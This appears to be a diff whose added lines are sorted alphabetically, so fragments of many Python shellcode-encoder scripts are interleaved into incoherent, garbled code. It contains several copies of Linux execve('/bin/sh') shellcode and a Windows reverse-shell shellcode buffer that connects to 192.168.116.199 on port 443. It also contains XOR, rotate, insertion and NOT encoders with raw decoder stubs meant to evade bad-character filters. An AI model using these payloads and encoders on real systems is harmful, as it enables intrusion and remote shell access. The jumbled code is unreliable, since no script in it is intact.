@@ -1,0 +1,375 @@
+bad_chars = '\x0a\x00\x0d'
+bad_chars = sys.argv[2].replace('\\x', '').decode('hex')
+break
+break
+break
+break
+buf += b"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
+buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
+buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
+buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
+buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
+buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
+buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
+buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
+buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
+buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
+buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
+buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
+buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
+buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
+buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
+buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
+buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
+buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
+buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x74\xc7\x68"
+buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
+buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
+buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
+buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
+buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
+buf = b""
+byte = (y + ROT)%256
+byte = byte ^ XOR
+byte = byte << nbits
+chunk = shellcode[0:2]
+chunk_no += 1
+chunk_no = 0
+count += 1
+count = 1
+counter += 1
+counter = 0
+Dec_hopcode = int(hopcode, 16)
+decoded += '\\x'
+decoded += '%02x' % x
+decoded = ""
+decoded2 += '%02x,' % x
+decoded2 += '0x'
+decoded2 = ""
+decoder_stub += '\x02\xeb\xe4\xe8\xdc\xff\xff\xff'
+decoder_stub += '\x1c\x0f\x88\xdf\x88\xd0\x30\xd8'
+decoder_stub += '\x31\xd8\x66\x89\x07\x41\x8d\x7f'
+decoder_stub += '\x74\x16\x66\x8b\x44\x0f\x01\x66'
+decoder_stub += '\xb2\x45\xeb\x1f\x5e\x8d\x3e\x8a'
+decoder_stub += "\x31\xd2\x5e\xbf\x90\x90\xaa\xaa"
+decoder_stub += "\x3c\x16\x32\x0c\x16\x32\x2c\x16"
+decoder_stub += "\x42\x42\x83\xc0\x04\x75\xc5\xff"
+decoder_stub += "\x7c\x04\x02\x88\x5c\x04\x03\x39"
+decoder_stub += "\x7c\x16\x05\x74\x0a\x42\x42\x42"
+decoder_stub += "\x7f\x83\xec\x7f\x8a\x5c\x16\x01"
+decoder_stub += "\x83\xec\x7f\x83\xec\x7f\x83\xec"
+decoder_stub += "\x88\x2c\x04\x88\x4c\x04\x01\x88"
+decoder_stub += "\x8a\x6c\x16\x04\x32\x1c\x16\x32"
+decoder_stub += "\x8a\x7c\x16\x02\x8a\x4c\x16\x03"
+decoder_stub += "\xe4\xe8\xa4\xff\xff\xff"
+decoder_stub = '\x31\xc0\x31\xdb\x31\xc9\x31\xd2'
+decoder_stub = "\xeb\x57\x31\xc0\x31\xdb\x31\xc9"
+decoder_stub = decoder_stub.replace('\x45', struct.pack('B', xor_byte))
+decoder_stub_hex = ''.join('\\x{}'.format(hex(ord(x))[2:]) for x in decoder_stub)
+def find_valid_xor_byte(bytes, bad_chars):
+def mask(n):
+def rol(n, rotations, width=8):
+def ror(n, rotations, width=8):
+elif xxx == '0x0':
+else:
+else:
+encode += '%02x,'%x
+encode += '0x'
+encode += '0xAA,'
+encode = ""
+encoded += '\\x'
+encoded += '\\x'
+encoded += '\\x'
+encoded += '\\x%02x' % 0xAA
+encoded += '\\x%02x' % rand
+encoded += '\\x%02x' % random.randint(1,169)
+encoded += '\\xbb'
+encoded += '\\xcc'
+encoded += '%02x' % (h & 0xff)
+encoded += '%02x' % (x & 0xff)
+encoded += '%02x' % (y & 0xff)
+encoded += '%02x' % x
+encoded += '%02x' % x
+encoded += '%02x' % y
+encoded += '%02x' % y
+encoded += '%02x' % y
+encoded += '%02x' %(7 -(256 - x))
+encoded += '%02x'%(x+7)
+encoded += hex(leader)[2:]
+encoded += insertByte[2:]
+encoded += xxx[2:]
+encoded = ' '
+encoded = '\\x'
+encoded = ""
+encoded = ""
+encoded = ""
+encoded = ""
+encoded = "\\x%02x," % len(bytearray(shellcode))
+encoded = []
+encoded = encoded + end
+encoded_instruction_in_hex = '%02x' % rox_encoded_instruction
+encoded_nasm += "%02x," %(z & 0xff)
+encoded_nasm += "0x"
+encoded_nasm = ""
+encoded_shellcode += '%02x, ' %byte
+encoded_shellcode += '%02x, ' %new
+encoded_shellcode += '%02x, ' %shift
+encoded_shellcode += '%02x, ' %xor
+encoded_shellcode += '0x'
+encoded_shellcode += "\\x"
+encoded_shellcode += "%02x" %(z & 0xff)
+encoded_shellcode = ""
+encoded_shellcode = ""
+encoded.append(struct.pack('B', val1))
+encoded.append(struct.pack('B', xor_byte))
+encoded.append(struct.pack('B', xor_byte))
+encoded.append(struct.pack('B', xor_byte))
+encoded1 += '\\x'
+encoded1 += '%02x' %j
+encoded1 = ""
+encoded2 += ','
+encoded2 += '%02x, ' %j
+encoded2 += '%02x,' % (y & 0xff)
+encoded2 += '%02x,' % x
+encoded2 += '%02x,' % x
+encoded2 += '%02x,' % y
+encoded2 += '%02x,' %(7 -(256 - x))
+encoded2 += '%02x,' %(h & 0xff)
+encoded2 += '%02x,' %(x+7)
+encoded2 += '%02x,' %y
+encoded2 += '0x'
+encoded2 += '0x'
+encoded2 += '0x'
+encoded2 += '0x%02x,' % 0xAA
+encoded2 += '0x%02x,' % rand
+encoded2 += hex(leader)[2:]
+encoded2 += insertByte[2:]
+encoded2 += xxx
+encoded2 = ' '
+encoded2 = '0x'
+encoded2 = ""
+encoded2 = ""
+encoded2 = ""
+encoded2 = ""
+encoded2 = "0x%02x," % len(bytearray(shellcode))
+encoded2P2 += '%02x,' % x
+encoded2P2 += '0x'
+encoded2P2 = ""
+encodedP2 += '\\x'
+encodedP2 += '%02x' % x
+encodedP2 = ""
+end = "\\xaa"
+except:
+execve_shellcode = bytearray(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80")
+execve_shellcode = bytearray(execve_shellcode)
+execve_shellcode.append(0x90)
+exit(1)
+exit(1)
+exit(2)
+exit(3)
+fb = int(hex(leader)[2:3],16)
+final_shellcode += '\\x' + byte.encode('hex')
+for bad_byte in bad_chars:
+for byte in bad_chars:
+for byte in bytes:
+for byte in decoder_stub:
+for byte in decoder_stub:
+for byte in encoder:
+for char in bad_chars:
+for i in bytearray(shellcode):
+for i in bytearray(shellcode):
+for i in execve_shellcode:
+for i in random.sample(range(1, 256), 255):
+for i in range(0, 2):
+for i in range(0, len(shellcode_original), 4):
+for i in range(0, padding):
+for x in bytearray(buf) :
+for x in bytearray(shellcode) :
+for x in bytearray(shellcode) :
+for x in bytearray(shellcode) :
+for x in bytearray(shellcode):
+for x in bytearray(shellcode):
+for x in bytearray(shellcode)[2:]:
+for y in bytearray(shellcode):
+format_0x += '0x'
+format_0x += encoded_instruction_in_hex+","
+format_0x = ""
+format_slash_x = ""
+h = (y + rot)%256
+hopcode = '%02x' %x
+i += 1
+i +=1
+i=0
+if "0x0," in format_0x:
+if (len(execve_shellcode)%2)!=0:
+if (r ^ shellcode_original[i] != 0) and (r ^ shellcode_original[i+1] != 0) and (r ^ shellcode_original[i+2] != 0) and (r ^ shellcode_original[i+3] != 0):
+if char == byte:
+if count % 2 != 0:
+if counter % 2 == 0 :
+if i < len(chunk):
+if i == int(byte.encode('hex'), 16):
+if i == int(byte.encode('hex'), 16):
+if len(shellcode_original) % 4 != 0:
+if len(sys.argv) != 3:
+if len(sys.argv) < 2:
+if len(sys.argv) < 2:
+if len(sys.argv) > 2:
+if len(xxx)>4:
+if matched_a_byte:
+if n >= 0:
+if not matched_a_byte:
+if padding:
+if rotations < 1:
+if rotations < 1:
+if struct.pack('B', val1 ^ i) == bad_byte:
+if stub_has_bad_char:
+if total != 2:
+if x < 128:
+if x < 128:
+if x == bytearray(shellcode)[n]:
+if x > 248:
+if x > 248:
+if xor_byte == 0:
+import binascii
+import random
+import random
+import random;
+import socket
+import struct
+import sys
+import sys
+import sys
+insertByte = hex(random.randint(1,255))
+j = (i + magic)%256
+leader = int(sys.argv[1])
+len(bytearray(shellcode)))
+length_format_0x = format_0x.count(',')
+magic = 13
+mask_value = mask(width)
+matched_a_byte = False
+matched_a_byte = True
+max_bits = 8
+n &= mask(width)
+n += 1
+n = 1
+n = len(bytearray(shellcode))
+nasm = nasm[1:]
+nasm = str(encoded).replace("\\x", ",0x")
+nbits = int(sys.argv[2])
+new = ~i & 0xff
+new = new ^ xor
+new = new << shift
+offset = 1
+orig = []
+orig.append(i)
+original_shellcode += '%02x, ' %x
+original_shellcode += '0x'
+original_shellcode = ""
+P = '\033[35m'
+padding = 0
+padding = 4 - (len(shellcode_original) % 4)
+r = random.randint(1,255)
+rand = random.randint(1,8)
+random.seed()
+res1 = ((x & val1) >> val2)
+res1 = (x << val2) & (val1)
+res2 = (x & val1)
+res2 = res2 & val1
+res2 = res2 >> (max_bits-val2)
+res2 = x << (max_bits - val2)
+return ((n << rotations) & mask_value) | (n >> (width - rotations))
+return (n >> rotations) | ((n << (width - rotations)) & mask_value)
+return 0
+return 2**n - 1
+return i
+return n
+return n
+rev_suplx = hex(suplX)[::-1]
+rot = 8
+ROT = int(sys.argv[1])
+rotations %= width
+rox_encoded_instruction = res1 | res2
+sb = int(hex(leader)[3:],16)
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80")
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+shellcode = ("\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80")
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+shellcode = shellcode[2::]
+shellcode = sys.argv[1].replace('\\x', '').decode('hex')
+shellcode =('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')
+shellcode_encoded = bytearray()
+shellcode_encoded_hex = ''.join('\\x{:02x}'.format(x) for x in shellcode_encoded)
+shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shellcode_encoded).rstrip(',')
+shellcode_encoded.append(0x90)
+shellcode_encoded.append(0xaa)
+shellcode_encoded.append(r)
+shellcode_encoded.append(shellcode_original[i] ^ r)
+shellcode_encoded.append(shellcode_original[i+1] ^ r)
+shellcode_encoded.append(shellcode_original[i+2] ^ r)
+shellcode_encoded.append(shellcode_original[i+3] ^ r)
+shellcode_file = sys.argv[1]
+shellcode_len=len(execve_shellcode)
+shellcode_original = bytearray.fromhex(f.read().strip().replace('\\x',''))
+shellcode_original_hex = ''.join('\\x{:02x}'.format(x) for x in shellcode_original)
+shellcode_original.append(0x90)
+shift = int(sys.argv[1])
+string1 = decoder_stub.join(encoded)
+stub_has_bad_char = False
+stub_has_bad_char = True
+subfs = fb-sb
+suplX = 255 - Dec_hopcode
+swapped = []
+swapped.append(execve_shellcode[x])
+swapped.append(execve_shellcode[x+1])
+swapped=", ".join(swapped[i:i+4] for i in range(0, len(swapped), 4))
+swapped="0x"+"0x".join(a+b for a,b in zip(swapped[::2], swapped[1::2]))
+swapped=binascii.hexlify(bytearray(swapped))
+sys.exit()
+sys.exit(0)
+total = len(sys.argv)
+try:
+val1 = 2**max_bits-1 
+val1 = int(byte.encode('hex'), 16) ^ i
+val2 = int(chunk[i].encode('hex'), 16) ^ xor_byte
+val2 = r_bits % max_bits
+W = '\033[0m'
+while len(shellcode) > 0:
+while x < shellcode_len:
+while(xor_byte_good == False):
+with open(shellcode_file) as f:
+x += 1
+x += 2
+x = ~x
+x = 0
+x = rol(x,rand) 
+x = x << 1
+x = x^0xDD
+x = x^rand 
+x = y - 0x10
+x = y - 0x2
+xor = int(sys.argv[2])
+XOR = int(sys.argv[3])
+xor_byte = 0
+xor_byte = find_valid_xor_byte(chunk, bad_chars)
+xor_byte = find_valid_xor_byte(string1, bad_chars)
+xor_byte_good = False
+xor_byte_good = True
+XOR_HEX = hex(XOR)
+xxx = hex(int(abs(subfs)) + int(rev_suplx[0:2],16))
+y ^= bytearray(shellcode)[1]
+Y = '\033[33m'
+y = ~x
+y = bytearray(shellcode)[0]^bytearray(shellcode)[1]
+y = x ^ 0x88
+y = x ^ 0x97
+y = x^0xAA
+y = x^bytearray(shellcode)[n]
+z = ~x
